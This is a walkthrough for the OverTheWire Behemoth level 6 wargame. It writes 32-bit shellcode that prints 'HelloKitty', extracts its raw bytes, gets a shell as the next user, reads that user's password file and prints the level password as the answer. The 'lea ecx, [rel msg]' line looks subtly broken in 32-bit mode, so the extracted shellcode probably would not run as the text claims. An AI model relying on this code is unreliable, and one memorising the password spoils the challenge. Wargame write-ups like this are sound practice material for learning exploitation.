# Behemoth Level 6 → 7

## Goal

`behemoth6` executes a helper program (`behemoth6_reader` or similar) that reads a file of **raw machine code from the current directory** and runs it. The binary expects that machine code to print the string `HelloKitty` — if the first 10 bytes of the helper's output match, `behemoth6` gives you a shell as `behemoth7`.

You write your own shellcode that prints `HelloKitty` and drop it where the reader will find it.

## Concepts you'll learn

- Writing short shellcode by hand (or with `nasm`)
- The Linux `write(2)` and `exit(2)` syscalls at the assembly level (`int 0x80` on x86)
- Extracting raw bytes from an assembled object file
- Running a binary from a directory you control so it finds *your* input file

## Walkthrough

### 1. See what behemoth6 does

```bash
$ cd /behemoth
$ strace -f ./behemoth6 2>&1 | grep -E 'execve|open|read'
```

You'll see it `execve`s something like `./behemoth6_reader`, and that helper reads a file (commonly called `shellcode.txt`) from the current directory — as raw bytes to execute. The parent then compares the output to `HelloKitty`.

### 2. Move to a directory you can write in

You can't write to `/behemoth`. Pick `/tmp`:

```bash
$ mkdir /tmp/t6
$ cd /tmp/t6
```

### 3. Write assembly that prints "HelloKitty" and exits

Save as `shellcode.asm`:

```nasm
; Linux x86, 32-bit
BITS 32

global _start
_start:
    ; write(1, msg, 10)
    mov eax, 4          ; syscall 4 = write
    mov ebx, 1          ; fd 1 = stdout
    lea ecx, [rel msg]  ; pointer to string
    mov edx, 10         ; length
    int 0x80

    ; exit(0)
    mov eax, 1          ; syscall 1 = exit
    xor ebx, ebx
    int 0x80

msg: db "HelloKitty"
```

### 4. Assemble and extract raw bytes

```bash
$ nasm -f elf32 shellcode.asm -o shellcode.o
$ ld -m elf_i386 shellcode.o -o shellcode
$ ./shellcode
HelloKitty
```

Verify it prints exactly `HelloKitty` (no trailing newline). Then dump the code section's raw bytes into the file the reader expects:

```bash
$ objcopy --dump-section .text=shellcode.txt shellcode
$ ls -l shellcode.txt
-rw-r--r-- 1 behemoth6 behemoth6 ... shellcode.txt
```

`shellcode.txt` now contains *just* the machine code — no ELF headers, no extra bytes.

### 5. Run behemoth6 from this directory

```bash
$ /behemoth/behemoth6
```

The reader opens `./shellcode.txt`, executes it, and the bytes print `HelloKitty`. `behemoth6` compares that to its expected string, matches, and drops you into a shell running as `behemoth7`:

```bash
$ whoami
behemoth7
$ cat /etc/behemoth_pass/behemoth7
baquoxuafo
```

### 6. If the filename is different

The exact filename the helper reads has varied between iterations of Behemoth. If `shellcode.txt` doesn't work, check `strace`:

```bash
$ strace -f /behemoth/behemoth6 2>&1 | grep open
```

Look for an `openat(..., "./<something>", ...) = 3` where `<something>` is a local file. Match that name and try again.

## The answer

The password for `behemoth7` is:

**`baquoxuafo`**

> ⚠️ OverTheWire may rotate passwords without notice. This value was correct at the time the level was solved — if it fails for you, re-solve the level using the method above rather than assuming the writeup is wrong.

## Reference

- Official level page: <https://overthewire.org/wargames/behemoth/behemoth6.html>
